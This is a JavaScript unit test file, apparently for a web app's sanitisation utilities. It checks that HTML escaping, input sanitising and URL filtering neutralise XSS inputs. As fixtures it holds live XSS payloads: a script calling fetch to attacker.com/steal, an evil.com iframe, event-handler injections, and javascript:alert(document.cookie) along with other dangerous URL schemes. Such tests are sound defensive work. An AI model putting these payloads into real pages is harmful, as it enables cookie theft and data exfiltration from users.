import { describe, it, expect } from 'vitest';
import { escapeHtml, sanitizeInput, sanitizeSafeUrl } from '../security';

describe('Security & XSS Prevention Utilities', () => {
  describe('escapeHtml', () => {
    it('escapes dangerous HTML characters to prevent DOM-based XSS', () => {
      const malicious = '<script>alert("XSS")</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
    });

    it('escapes quotes, ampersands, and equal signs', () => {
      const input = `<img src='x' onerror="alert(1)" name=test>`;
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
      expect(escaped).not.toContain('"');
      expect(escaped).not.toContain("'");
    });

    it('returns empty string for null or undefined input', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
    });
  });

  describe('sanitizeXSS / sanitizeInput', () => {
    it('strips <script> tags and embedded contents', () => {
      const input = 'Hello <script>fetch("https://attacker.com/steal")</script> World';
      expect(sanitizeInput(input)).toBe('Hello  World');
    });

    it('strips dangerous HTML tags (iframe, object, embed, form)', () => {
      const input = 'Check this <iframe src="evil.com"></iframe> out!';
      expect(sanitizeInput(input)).toBe('Check this  out!');
    });

    it('removes inline event handlers (onclick, onerror, onload)', () => {
      const input = '<button onclick="alert(1)" onmouseover=\'hack()\'>Click</button>';
      expect(sanitizeInput(input)).toBe('<button>Click</button>');
    });

    it('removes javascript: pseudo-protocols', () => {
      const input = 'Click here: javascript:alert(document.cookie)';
      expect(sanitizeInput(input)).toBe('Click here:');
    });

    it('strips invisible ASCII control characters', () => {
      const input = 'Clean\u0000\u0008\u001FText';
      expect(sanitizeInput(input)).toBe('CleanText');
    });
  });

  describe('sanitizeSafeUrl', () => {
    it('allows valid https and http URLs', () => {
      expect(sanitizeSafeUrl('https://example.com/audio.mp3')).toBe(
        'https://example.com/audio.mp3'
      );
      expect(sanitizeSafeUrl('http://cdn.com/image.png')).toBe('http://cdn.com/image.png');
    });

    it('blocks javascript: and vbscript: dangerous URLs', () => {
      expect(sanitizeSafeUrl('javascript:alert(1)')).toBeNull();
      expect(sanitizeSafeUrl('JAVASCRIPT:void(0)')).toBeNull();
      expect(sanitizeSafeUrl('vbscript:msgbox("test")')).toBeNull();
      expect(sanitizeSafeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
    });

    it('returns null for empty or whitespace-only inputs', () => {
      expect(sanitizeSafeUrl('')).toBeNull();
      expect(sanitizeSafeUrl('   ')).toBeNull();
      expect(sanitizeSafeUrl(null)).toBeNull();
    });
  });
});
